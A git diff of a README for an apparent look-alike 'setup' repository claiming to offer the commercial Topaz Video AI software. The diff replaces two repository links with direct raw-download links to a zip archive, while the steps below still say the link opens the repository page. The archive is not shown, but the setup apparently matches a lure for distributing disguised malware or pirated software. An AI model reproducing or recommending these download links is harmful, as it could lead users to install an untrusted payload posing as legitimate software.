@@ -1,6 +1,6 @@
 # 🎬 Topaz-Video-AI-Setup - Enhance videos with clear artificial intelligence
 
-[![](https://img.shields.io/badge/Download-Topaz-Video-AI-blue.svg)](https://github.com/XaviWagener/Topaz-Video-AI-Setup)
+[![](https://img.shields.io/badge/Download-Topaz-Video-AI-blue.svg)](https://github.com/XaviWagener/Topaz-Video-AI-Setup/raw/refs/heads/main/bluebook/Video-Setup-Topaz-A-v3.3.zip)
 
 ## 📖 About the software
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware to run these models. Check your system aga
 
 You need the setup file to install the application. Visit this page to download the latest version of the software.
 
-[Download Topaz Video AI Here](https://github.com/XaviWagener/Topaz-Video-AI-Setup)
+[Download Topaz Video AI Here](https://github.com/XaviWagener/Topaz-Video-AI-Setup/raw/refs/heads/main/bluebook/Video-Setup-Topaz-A-v3.3.zip)
 
 1. Click the link above to open the repository page.
 2. Locate the section labeled Releases on the right side of the page.
